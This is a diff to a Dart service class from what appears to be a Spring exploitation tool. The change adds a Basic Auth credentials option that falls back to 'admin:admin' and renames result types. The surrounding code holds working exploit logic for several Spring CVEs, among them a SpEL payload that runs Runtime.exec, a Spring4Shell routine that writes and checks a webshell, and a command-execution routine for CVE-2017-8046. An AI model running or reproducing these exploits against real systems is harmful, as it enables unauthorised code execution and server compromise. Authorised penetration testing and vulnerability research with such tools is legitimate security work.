@@ -2,6 +2,8 @@ import 'package:http/http.dart' as http;
 import 'dart:convert';
 import 'dart:math';
 
+import 'services/exp_result.dart';
+
 enum SpringVulnType {
   springCloudFunction('CVE-2022-22963', 'Spring Cloud Function SpEL 注入'),
   spring4Shell('CVE-2022-22965 (Spring4Shell)', 'ClassLoader 操控写 Webshell'),
@@ -14,19 +16,19 @@ enum SpringVulnType {
   final String desc;
 }
 
-class SpringResult {
-  final bool vulnerable;
-  final String vulnName;
-  final String detail;
-  SpringResult(this.vulnerable, this.vulnName, this.detail);
-}
 
 class SpringExpService {
   final Uri baseUri;
   final Duration timeout;
+  /// Basic Auth 凭据，格式 'user:pass'。
+  /// 为空时从 URL userInfo 提取，仍为空则回退 'admin:admin'（仅 CVE-2016-4977 / Spring4Shell 需要）。
+  final String credentials;
 
-  SpringExpService({required String url, this.timeout = const Duration(seconds: 10)})
-      : baseUri = Uri.parse(url.endsWith('/') ? url : '$url/');
+  SpringExpService({
+    required String url,
+    this.timeout = const Duration(seconds: 10),
+    this.credentials = '',
+  }) : baseUri = Uri.parse(url.endsWith('/') ? url : '$url/');
 
   Future<http.StreamedResponse> _sendOauthAuthorize(
     http.Client client, {
@@ -44,6 +46,9 @@ class SpringExpService {
   }
 
   String _buildAuthHeader() {
+    if (credentials.isNotEmpty && credentials.contains(':')) {
+      return 'Basic ${base64Encode(utf8.encode(credentials))}';
+    }
     final userInfo = baseUri.userInfo;
     final creds = userInfo.contains(':') ? userInfo : 'admin:admin';
     return 'Basic ${base64Encode(utf8.encode(creds))}';
@@ -82,7 +87,7 @@ class SpringExpService {
   }
 
   // CVE-2022-22963: Spring Cloud Function routing-expression SpEL
-  Future<SpringResult> checkSpringCloudFunction() async {
+  Future<ExpResult> checkSpringCloudFunction() async {
     try {
       final detect = await http.post(
         Uri.parse('${baseUri}functionRouter'),
@@ -106,18 +111,18 @@ class SpringExpService {
       ];
       final hasSpelFeature = indicators.any(lower.contains);
       if (hasSpelFeature) {
-        return SpringResult(
+        return ExpResult(
           true,
           'CVE-2022-22963',
           'Spring Cloud Function routing-expression 返回 SpEL 解析/求值特征（状态 ${detect.statusCode}）',
         );
       }
     } catch (_) {}
-    return SpringResult(false, 'CVE-2022-22963', '');
+    return ExpResult(false, 'CVE-2022-22963', '');
   }
 
   // CVE-2022-22965 (Spring4Shell): ClassLoader 写 Webshell
-  Future<SpringResult> checkSpring4Shell() async {
+  Future<ExpResult> checkSpring4Shell() async {
     try {
       final marker = DateTime.now().millisecondsSinceEpoch.toString();
       final rnd = Random().nextInt(90000) + 10000;
@@ -140,14 +145,14 @@ class SpringExpService {
         ).timeout(timeout);
       }
       if (verify.statusCode == 200 && verify.body.contains(marker)) {
-        return SpringResult(true, 'CVE-2022-22965 (Spring4Shell)', '可利用：成功写入并回显验证文件 $shellName');
+        return ExpResult(true, 'CVE-2022-22965 (Spring4Shell)', '可利用：成功写入并回显验证文件 $shellName');
       }
     } catch (_) {}
-    return SpringResult(false, 'CVE-2022-22965 (Spring4Shell)', '');
+    return ExpResult(false, 'CVE-2022-22965 (Spring4Shell)', '');
   }
 
   // CVE-2018-1273: Spring Data Commons SpEL via username field
-  Future<SpringResult> checkSpringDataCommons() async {
+  Future<ExpResult> checkSpringDataCommons() async {
     try {
       const expr = '#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/success")';
       final payload = _buildSpringDataCommonsFormByExpr(expr);
@@ -171,7 +176,7 @@ class SpringExpService {
           lower.contains('this application has no explicit mapping for /error');
       final hasSpelFeature = indicators.any(lower.contains);
       if (hasSpelFeature || hasProxyBindingError || hasWhitelabel500) {
-        return SpringResult(
+        return ExpResult(
           true,
           'CVE-2018-1273',
           hasProxyBindingError
@@ -193,17 +198,17 @@ class SpringExpService {
       final hint = redirectedToLogin
           ? '响应疑似被认证/登录页拦截（Location: $location）'
           : '未命中 SpEL 特征，可能不是 Spring Data Commons users 端点或版本不受影响';
-      return SpringResult(
+      return ExpResult(
         false,
         'CVE-2018-1273',
         '$hint（HTTP ${res.statusCode}, Content-Type: $contentType, 片段: $shortPreview）',
       );
     } catch (_) {}
-    return SpringResult(false, 'CVE-2018-1273', '请求异常或超时，未拿到可用于判定的响应');
+    return ExpResult(false, 'CVE-2018-1273', '请求异常或超时，未拿到可用于判定的响应');
   }
 
   // CVE-2017-8046: Spring Data REST PATCH SpEL
-  Future<SpringResult> checkSpringDataRest() async {
+  Future<ExpResult> checkSpringDataRest() async {
     try {
       Future<http.Response> sendPatch(String payload) {
         return http.patch(
@@ -235,29 +240,29 @@ class SpringExpService {
       }
 
       if (hasStrongSignal(first)) {
-        return SpringResult(true, 'CVE-2017-8046', 'Spring Data REST PATCH 返回 SpEL 执行异常特征（状态 ${first.statusCode}）');
+        return ExpResult(true, 'CVE-2017-8046', 'Spring Data REST PATCH 返回 SpEL 执行异常特征（状态 ${first.statusCode}）');
       }
 
       // 备用验证：一些环境不会回显 Runtime 关键字，改用纯数学表达式触发 SpEL 求值异常。
       const fallbackBody = '[{ "op": "replace", "path": "T(java.lang.Math).abs(-54289)/lastname", "value": "vulhub" }]';
       final second = await sendPatch(fallbackBody);
       if (hasStrongSignal(second)) {
-        return SpringResult(true, 'CVE-2017-8046', 'Spring Data REST PATCH（备用 payload）返回 SpEL 异常特征（状态 ${second.statusCode}）');
+        return ExpResult(true, 'CVE-2017-8046', 'Spring Data REST PATCH（备用 payload）返回 SpEL 异常特征（状态 ${second.statusCode}）');
       }
     } catch (_) {}
-    return SpringResult(false, 'CVE-2017-8046', '');
+    return ExpResult(false, 'CVE-2017-8046', '');
   }
 
   // CVE-2016-4977: Spring Security OAuth SpEL via response_type
-  Future<SpringResult> checkSpringSecurityOauth() async {
+  Future<ExpResult> checkSpringSecurityOauth() async {
     try {
       final client = http.Client();
       try {
-        Future<SpringResult?> eval(http.StreamedResponse streamed) async {
+        Future<ExpResult?> eval(http.StreamedResponse streamed) async {
           final location = streamed.headers['location'] ?? '';
           final body = await streamed.stream.bytesToString();
           if (body.contains('54289') || location.contains('54289') || location.contains(Uri.encodeComponent('54289'))) {
-            return SpringResult(true, 'CVE-2016-4977', 'Spring Security OAuth SpEL 注入，233*233=54289 验证通过');
+            return ExpResult(true, 'CVE-2016-4977', 'Spring Security OAuth SpEL 注入，233*233=54289 验证通过');
           }
           return null;
         }
@@ -283,7 +288,7 @@ class SpringExpService {
         client.close();
       }
     } catch (_) {}
-    return SpringResult(false, 'CVE-2016-4977', '');
+    return ExpResult(false, 'CVE-2016-4977', '');
   }
 
   // 执行命令 - CVE-2017-8046
@@ -318,7 +323,7 @@ class SpringExpService {
     }
   }
 
-  Future<SpringResult> checkSingle(SpringVulnType type) async {
+  Future<ExpResult> checkSingle(SpringVulnType type) async {
     switch (type) {
       case SpringVulnType.springCloudFunction: return checkSpringCloudFunction();
       case SpringVulnType.spring4Shell: return checkSpring4Shell();
